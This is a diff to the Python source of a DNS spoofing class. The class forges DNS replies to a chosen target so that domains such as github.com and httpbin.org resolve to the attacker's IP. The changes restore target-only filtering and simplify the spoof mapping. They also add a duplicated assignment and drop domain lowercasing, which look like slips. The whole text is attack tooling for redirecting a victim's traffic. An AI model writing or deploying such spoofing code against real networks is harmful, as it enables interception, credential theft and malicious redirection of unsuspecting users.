@@ -24,15 +24,13 @@ class DNSSpoofer:
         self.packet_handler = packet_handler
         self.running = False
         self.spoofed_count = 0
+        self.spoofed_count = 0
 
         # Get our IP from the interface
         self.attacker_ip = self._get_interface_ip()
 
         # Default domains to spoof (well this is just what im using for tests rnow)
-        if dns_mapping:
-            self.spoof_domains = {k.lower(): v for k, v in dns_mapping.items()}
-        else:    
-            self.spoof_domains = dns_mapping or {
+        self.spoof_domains = dns_mapping or {
             'github.com': self.attacker_ip,
             'www.github.com': self.attacker_ip,
             'httpbin.org': self.attacker_ip,
@@ -113,16 +111,16 @@ class DNSSpoofer:
                     packet[UDP].dport == 53):  # DNS port
 
                 # Only process queries from target
-                # if packet[IP].src != self.target_ip:
-                #    return False
+                if packet[IP].src != self.target_ip:
+                    return False
 
                 # Get queried domain
                 if packet.haslayer(DNSQR):
                     qname = packet[DNSQR].qname
                     if isinstance(qname, bytes):
-                        domain = qname.decode('utf-8').rstrip('.').lower()
+                        domain = qname.decode('utf-8').rstrip('.')
                     else:
-                        domain = str(qname).rstrip('.').lower()
+                        domain = str(qname).rstrip('.')
 
                     # Check if we should spoof this domain
                     spoof_ip = None
